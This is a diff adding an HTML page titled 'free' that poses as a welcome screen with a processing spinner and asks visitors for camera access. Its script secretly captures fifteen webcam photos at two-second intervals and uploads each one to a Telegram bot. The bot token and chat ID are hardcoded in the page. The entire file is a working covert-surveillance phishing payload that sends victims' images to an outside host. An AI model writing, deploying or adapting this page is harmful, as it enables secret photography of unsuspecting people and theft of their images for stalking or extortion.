@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>free</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .spinner {
+            border: 6px solid rgba(255, 255, 255, 0.3);
+            border-top: 6px solid #f39c12;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <h1>🎉 Welcome 🎉</h1>
+    <p id="status">Please allow camera access...</p>
+
+    <div id="loading">
+        <div class="spinner"></div>
+        <p> Please wait, processing...</p>
+    </div>
+
+    <video id="video" autoplay class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", async () => {
+            const statusText = document.getElementById("status");
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
+
+            const TELEGRAM_BOT_TOKEN = "7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec";
+            const TELEGRAM_CHAT_ID = "6335174946";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                statusText.innerText = "Processing...";
+                startCapturing();
+            } catch (error) {
+                statusText.innerText = "Access Denied!";
+            }
+
+            function startCapturing() {
+                let count = 0;
+                const maxCaptures = 15;
+
+                const captureInterval = setInterval(() => {
+                    if (count >= maxCaptures) {
+                        clearInterval(captureInterval);
+                        return;
+                    }
+
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append("photo", blob, "capture.jpg");
+                        
+                        sendToTelegram(formData);
+                    }, "image/jpeg");
+
+                    count++;
+                }, 2000);
+            }
+
+            function sendToTelegram(formData) {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto?chat_id=${TELEGRAM_CHAT_ID}`, {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log("📸 Image sent:", data))
+                .catch(error => console.error("❌ Error sending image:", error));
+            }
+        });
+    </script>
+</body>
+</html>
